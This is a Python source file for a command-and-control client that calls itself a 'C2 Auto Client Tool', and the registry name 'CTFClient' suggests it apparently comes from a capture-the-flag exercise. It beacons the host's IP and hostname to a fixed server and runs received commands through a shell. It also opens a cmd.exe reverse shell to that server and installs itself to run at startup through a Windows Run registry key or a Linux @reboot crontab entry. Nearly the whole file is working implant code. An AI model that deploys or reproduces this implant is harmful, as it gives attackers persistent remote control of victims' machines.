import socket
import argparse
import time
import platform
import os
import subprocess
import threading
import sys

BUFFER_SIZE = 4096


def execute_command(command):
    """Execute the received command and return its output."""
    try:
        command_to_run = f"echo off {command}"
        result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)



def s2p(s, p):
    """Transfer data from socket to the process's stdin."""
    try:
        while True:
            data = s.recv(BUFFER_SIZE)
            if not data:
                break
            p.stdin.write(data.decode())
            p.stdin.flush()
    except Exception as e:
        print(f"s2p thread error: {e}")


def p2s(s, p):
    """Transfer data from process's stdout to the socket."""
    try:
        while True:
            data = p.stdout.readline()
            if not data:
                break
            s.send(data.encode())  # Convert string to bytes before sending
    except Exception as e:
        print(f"p2s thread error: {e}")


def reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        # Set up the process to communicate with cmd.exe
        p = subprocess.Popen(["cmd.exe"],
                             stdin=subprocess.PIPE,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE,
                             text=True,
                             bufsize=1,
                             universal_newlines=True)

        # Start communication threads
        s2p_thread = threading.Thread(target=s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        s2p_thread.join()
        p2s_thread.join()

        s.close()
    except Exception as e:
        print(f"Reverse shell error: {e}")

def initiate_reverse_shell(server_ip, shell_port):
    rs_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    rs_socket.connect((server_ip, shell_port))

    p = subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    s2p_thread = threading.Thread(target=s2p, args=[rs_socket, p])
    s2p_thread.daemon = True
    print("starting s2p")
    s2p_thread.start()

    p2s_thread = threading.Thread(target=p2s, args=[rs_socket, p])
    p2s_thread.daemon = True
    print("p2s starting")
    p2s_thread.start()

    print("Threads started. Shell process should be running concurrently.")

    # Don't wait for the shell process to finish here
    # try:
    #     p.wait()
    # except KeyboardInterrupt:
    #     rs_socket.close()

    s2p_thread.join()  # Wait for s2p_thread to finish
    p2s_thread.join()  # Wait for p2s_thread to finish






# ... (previous code)

def start_reverse_shell(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.sendall("start_reverse_shell".encode('utf-8'))
        response = s.recv(BUFFER_SIZE).decode('utf-8')
        print(response)  # Debugging print
        time.sleep(1)

        if response == "Starting reverse shell...":
            reverse_shell(host, 5555)  # Adjusted to a different port
    except Exception as e:
        print(f"Error starting reverse shell: {e}")

def send_to_server(host, port, delay=5):
    time.sleep(delay)
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))
                client_info = f"IP: {socket.gethostbyname(socket.gethostname())}, Hostname: {socket.gethostname()}"
                s.sendall(client_info.encode('utf-8'))

                while True:  # This loop maintains the connection once established
                    command = s.recv(BUFFER_SIZE).decode('utf-8')
                    print(f"recived shell command")
                    if not command:
                        break
                    elif command == 'exit':
                        s.sendall("Client closing connection.".encode('utf-8'))
                        break
                    elif command == 'start_reverse_shell':
                        message = "starting shell on agent"
                        print(message)
                        print("Attempting to start reverse shell...")  # Debugging print
                        s.sendall("Starting reverse shell...".encode('utf-8'))
                        #time.sleep(5)
                        reverse_shell(host, 5555)  # Adjusted to a different port

                    else:
                        result = execute_command(command)
                        s.sendall(result.encode('utf-8'))
                
                # If you've reached here, the server has disconnected. Pause for a bit before attempting to reconnect.
                time.sleep(10)

        except Exception as e:
            print(f"Error: {e}")
            time.sleep(10)  # If there's an error (e.g., can't connect), wait for a bit before trying again.


def ensure_persistence():
    current_os = platform.system()

    if current_os == "Windows":
        script_path = f"python {os.path.realpath(__file__)}"
        add_to_startup_windows(script_path)
    elif current_os == "Linux":
        script_path = f"python3 {os.path.realpath(__file__)}"
        add_to_startup_linux(script_path)
    print("Added to startup!")

def add_to_startup_windows(script_path):
    try:
        import winreg as reg
        script_path = f'"{sys.executable}" "{os.path.realpath(__file__)}"'
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "CTFClient"
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, value_name, 0, reg.REG_SZ, script_path)
        reg.CloseKey(reg_key)
    except Exception as e:
        print(f"Failed to add to startup on Windows: {e}")

def add_to_startup_linux(script_path):
    try:
        cron_command = f"@reboot '{sys.executable}' '{os.path.realpath(__file__)}' &"
        process = subprocess.Popen(['crontab', '-l'], stdout=subprocess.PIPE)
        current_cron = process.communicate()[0]
        new_cron = current_cron + cron_command.encode()
        with open("new_cron.txt", "wb") as f:
            f.write(new_cron)
        subprocess.call(['crontab', 'new_cron.txt'])
        os.remove("new_cron.txt")
    except Exception as e:
        print(f"Failed to add to startup on Linux: {e}")






def main():
    parser = argparse.ArgumentParser(description="C2 Auto Client Tool")
    parser.add_argument("--host", default='192.168.0.108', help="Server host to connect to")
    parser.add_argument("--port", type=int, default=5555, help="Server port for reverse shell")  # Changed default
    parser.add_argument("--command_port", type=int, default=12345, help="Server port for command handling")
    parser.add_argument("--delay", type=int, default=5, help="Delay in seconds before auto-executing")

    args = parser.parse_args()

    ensure_persistence()
    #reverse_shell(args.host, args.port)   
    send_to_server(args.host, args.command_port, args.delay)


if __name__ == "__main__":
    main()
